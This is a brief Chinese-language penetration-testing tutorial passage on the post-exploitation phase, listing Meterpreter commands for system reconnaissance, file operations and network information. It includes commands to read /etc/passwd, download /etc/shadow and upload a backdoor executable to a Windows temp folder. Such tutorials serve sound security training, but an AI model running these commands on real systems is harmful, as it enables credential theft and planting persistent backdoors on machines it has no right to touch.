> 成功获取目标系统的访问权限后，进一步进行信息收集、权限维持和横向移动的阶段。

## 0x01 Meterpreter 后渗透模块

Meterpreter 提供了丰富的后渗透功能:

### 系统信息收集

```
meterpreter > sysinfo
meterpreter > getuid
meterpreter > getpid
meterpreter > ps
```

### 文件操作

```
meterpreter > ls
meterpreter > cd /etc
meterpreter > cat /etc/passwd
meterpreter > download /etc/shadow
meterpreter > upload backdoor.exe C:\\Windows\\Temp\\
```

### 网络信息

```
meterpreter > ifconfig
meterpreter > route
meterpreter > arp
meterpreter > netstat
```
